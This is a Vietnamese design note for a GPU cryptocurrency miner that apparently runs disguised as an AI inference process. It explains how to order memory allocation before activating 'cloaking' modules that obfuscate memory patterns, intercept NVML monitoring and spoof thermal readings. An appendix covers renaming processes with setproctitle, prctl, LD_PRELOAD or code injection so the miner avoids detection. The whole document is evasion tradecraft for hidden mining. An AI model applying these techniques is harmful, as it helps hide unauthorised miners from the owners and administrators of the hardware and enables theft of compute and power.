# Phương án tối ưu: Cấp phát bộ nhớ Mining trước khi kích hoạt Cloaking & Tối ưu hóa

## 1. Mục tiêu
- Đảm bảo tiến trình mining (khai thác) **cấp phát xong toàn bộ bộ nhớ lớn** (DAG buffer, work buffers) trước khi kích hoạt các chức năng **tối ưu hóa** và **cloaking** (ẩn danh hóa).
- Tránh xung đột cấp phát bộ nhớ (memory allocation conflict) giữa mining và các module phụ, giảm nguy cơ lỗi `bad_alloc`.
- **Lưu ý quan trọng:** **PID thật của tiến trình mining chỉ được publish từ module `wrappers/stealth_inference_cuda.py`.** Các module khác chỉ nên lắng nghe (subscribe) sự kiện này để kích hoạt cloaking/tối ưu hóa.

---

## 2. Quy trình kỹ thuật (đã điều chỉnh)

### **Bước 1: Khởi động tiến trình mining qua wrapper**
- Hệ thống gọi shell script hoặc trực tiếp gọi Python wrapper:
  ```bash
  python3 wrappers/stealth_inference_cuda.py [args]
  ```
- Wrapper này sẽ:
  - Thiết lập môi trường stealth
  - Khởi động tiến trình mining thực sự (binary mining)

### **Bước 2: Mining cấp phát bộ nhớ lớn**
- Tiến trình mining thực sự (process con) sẽ:
  - Cấp phát **DAG buffer** (bộ nhớ lớn, vài GB)
  - Cấp phát **work buffers** (bộ nhớ trung bình)
  - Kết nối pool, load DAG, chuẩn bị sẵn sàng

### **Bước 3: Publish PID thật từ wrapper**
- **Chỉ khi tiến trình mining thực sự đã khởi động thành công**, wrapper sẽ lấy **PID thật** của process con và **publish lên EventBus**:
  ```python
  # Trong wrappers/stealth_inference_cuda.py
  proc = subprocess.Popen(mining_cmd, env=os.environ)
  # ... kiểm tra mining đã sẵn sàng ...
  eventbus.publish('mining:gpu_pid_registered', {
      'pid': proc.pid,
      'status': 'ready_for_cloaking',
      'timestamp': time.time()
  })
  ```
- **Cảnh báo:** Không publish PID từ bên ngoài wrapper, vì PID này không phải PID thật của mining.

### **Bước 4: Kích hoạt các chức năng tối ưu & cloaking**
- Các module như **Memory Pattern Obfuscation (MPO)**, **NVML Interception**, **Thermal Spoofing** sẽ **chỉ bắt đầu hoạt động khi nhận được PID thật** từ sự kiện do wrapper publish.
- Đảm bảo các module này **không chiếm dụng VRAM** trước khi mining hoàn thành cấp phát lớn.

---

## 3. Lợi ích của phương án
- **Tránh phân mảnh bộ nhớ (memory fragmentation)**: Mining luôn được ưu tiên cấp phát vùng lớn liên tục.
- **Giảm nguy cơ lỗi `std::bad_alloc`**: Không còn xung đột khi mining cần cấp phát DAG mới hoặc work buffer lớn.
- **Tăng độ ổn định**: Mining hoạt động ổn định, các chức năng cloaking chỉ chạy khi an toàn.
- **Đảm bảo giám sát và tối ưu hóa đúng tiến trình thực sự**: Không bị nhầm lẫn giữa PID wrapper và PID thật.
- **Dễ debug, dễ kiểm soát**: Log rõ ràng, dễ theo dõi thứ tự khởi động và trạng thái hệ thống.

---

## 4. Chú giải thuật ngữ tiếng Anh
- **[DAG buffer]**: Bộ nhớ lớn dùng cho thuật toán mining (Ethash/Kawpow), thường vài GB, thay đổi theo epoch.
- **[Work buffer]**: Bộ nhớ trung bình dùng cho batch, scratchpad, intermediate data trong quá trình mining.
- **[EventBus]**: Hệ thống truyền thông nội bộ giữa các module/luồng, cho phép publish/subscribe sự kiện.
- **[Cloaking]**: Kỹ thuật ẩn danh hóa hoạt động mining, gồm Memory Pattern Obfuscation, NVML Interception, Thermal Spoofing.
- **[Memory fragmentation]**: Phân mảnh bộ nhớ, khiến không thể cấp phát vùng lớn dù tổng VRAM còn dư.
- **[std::bad_alloc]**: Ngoại lệ C++ báo lỗi khi không thể cấp phát bộ nhớ động.
- **[Wrapper]**: Script trung gian (ở đây là Python) dùng để thiết lập môi trường và khởi động tiến trình mining thực sự.
- **[PID thật]**: Process ID của tiến trình mining thực sự (process con do wrapper khởi động).

---

## 5. Lưu ý triển khai
- **Tuyệt đối không publish PID mining từ bên ngoài wrapper**. Chỉ publish PID thật từ bên trong `stealth_inference_cuda.py` sau khi process con đã khởi động thành công.
- Các module cloaking/tối ưu hóa chỉ nên subscribe sự kiện này để bắt đầu hoạt động.
- Nếu mining cần cấp phát lại (ví dụ chuyển epoch), nên tạm dừng cloaking, chờ mining cấp phát xong rồi resume cloaking.
- Có thể áp dụng selective pause cho các module cloaking chỉ khi thực sự cần thiết.

---

**Tóm lại:**
> Đảm bảo mining cấp phát xong toàn bộ bộ nhớ lớn trước khi kích hoạt cloaking là giải pháp tối ưu để tăng ổn định, giảm lỗi và vẫn giữ được tính ẩn danh cho hệ thống mining GPU. **PID thật của mining chỉ được publish từ wrapper, các module khác chỉ nên lắng nghe sự kiện này.**

---

## Phụ lục: Phân tích cơ chế đổi tên process (Process Name Obfuscation) với stealth_inference_cuda.py

### 1. Tổng quan
- **stealth_inference_cuda.py** là Python wrapper (trình bọc ngoài) chịu trách nhiệm khởi động tiến trình mining thực sự (binary mining).
- Module này thường được dùng để thiết lập môi trường ẩn danh (stealth), đổi tên process, và publish PID thật lên EventBus.

### 2. Sự khác biệt giữa PID wrapper và PID thật
- **PID wrapper**: Process ID của chính script Python (stealth_inference_cuda.py).
- **PID thật**: Process ID của tiến trình mining thực sự (binary, ví dụ: /app/inference-cuda.original), được khởi động bởi wrapper.
- Hai PID này là hai process hoàn toàn độc lập trên hệ thống.

### 3. Kỹ thuật đổi tên process
- **Đổi tên PID wrapper**:
  - Có thể thực hiện trực tiếp trong Python bằng các thư viện như `setproctitle` hoặc `prctl`.
  - Ảnh hưởng: Chỉ đổi tên chính process Python (wrapper), không ảnh hưởng đến process con.
- **Đổi tên PID thật (mining binary)**:
  - Chỉ thực hiện được nếu binary mining hỗ trợ (qua tham số, biến môi trường) hoặc dùng kỹ thuật nâng cao như LD_PRELOAD, inject code, patch argv process con.
  - Nếu không có hỗ trợ, wrapper không thể tự ý đổi tên process con.

### 4. Quy trình thực tế
1. Wrapper khởi động, có thể đổi tên chính nó.
2. Wrapper tạo tiến trình con (mining binary) – đây là PID thật.
3. Nếu binary mining hỗ trợ, tiến trình con sẽ tự đổi tên khi khởi động.
4. Wrapper lấy PID thật và publish lên EventBus để các module khác (cloaking, tối ưu hóa) kích hoạt theo đúng PID thật.

### 5. Kết luận
- **stealth_inference_cuda.py** chỉ đổi tên chính nó (wrapper) một cách trực tiếp.
- Đổi tên PID thật chỉ thực hiện được nếu binary mining hỗ trợ hoặc có kỹ thuật đặc biệt.
- Đổi tên wrapper không ảnh hưởng đến PID thật.
- Các module khác chỉ nên nhận và thao tác với PID thật để đảm bảo hiệu quả cloaking/tối ưu hóa.

### 6. Chú giải thuật ngữ
- **Process name obfuscation**: Ẩn danh tên tiến trình, đổi tên process để tránh bị phát hiện.
- **Wrapper**: Script bọc ngoài, quản lý tiến trình con.
- **PID wrapper**: Process ID của script wrapper (Python).
- **PID thật**: Process ID của tiến trình mining thực sự (binary).